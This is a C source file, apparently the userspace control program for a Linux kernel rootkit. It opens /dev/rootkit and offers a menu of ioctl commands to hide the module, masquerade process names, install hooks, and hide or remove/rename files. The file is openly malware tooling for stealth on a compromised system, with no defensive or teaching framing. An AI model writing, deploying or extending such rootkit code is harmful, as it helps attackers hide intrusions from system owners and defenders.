#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "rootkit.h"

int main() {
    
    int fd = open("/dev/rootkit", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "error: open: %s\n", strerror(errno));
        exit(1);
    }
	unsigned char c = 0;

    while (1) {
        
		if ((int)c == 255 || c == 'y')
				break;
		
		int choice;
		printf("Choose an IOCTL operation to perform:\n");
		printf("0: IOCTL_MOD_HIDE\n");
		printf("1: IOCTL_MOD_MASQ\n");
		printf("2: IOCTL_MOD_HOOK\n");
		printf("3: IOCTL_FILE_HIDE\n");
		printf("4: IOCTL_FILE_RMRN\n");
		printf("Enter your choice (0-4): ");
		scanf("%d", &choice);

		switch (choice) {
			case 0:
				ioctl(fd, IOCTL_MOD_HIDE);
				break;
			case 1: {
				struct masq_proc_req req = {};
				printf("Number of requests: ");
				scanf("%ld", &req.len);
				if (req.len > 0)
				{
					req.list = malloc(sizeof(struct masq_proc)*req.len);
					for (int i = 0; i < req.len; i++)
					{	
						printf("orig: ");
						scanf("%s", req.list[i].orig_name);
						printf("new: ");
						scanf("%s", req.list[i].new_name);
					}
					ioctl(fd, IOCTL_MOD_MASQ, &req);
				}
				break;
			}
			case 2:
				ioctl(fd, IOCTL_MOD_HOOK);
				break;
			case 3: {
				struct hided_file hf;
				printf("Filename: ");
				scanf("%s", hf.name);
				ioctl(fd, IOCTL_FILE_HIDE, &hf);
				break;
			}
			case 4: {
				struct rm_file rf;
				printf("Filename: ");
				scanf("%s", rf.rm_name);
				ioctl(fd, IOCTL_FILE_RMRN, &rf);
				break;
			}
			default:
				printf("Invalid choice.\n");
		}

		printf("Exit [y/n]:");
        getchar();
		c = getchar();
	}
    close(fd);

    return 0;
}
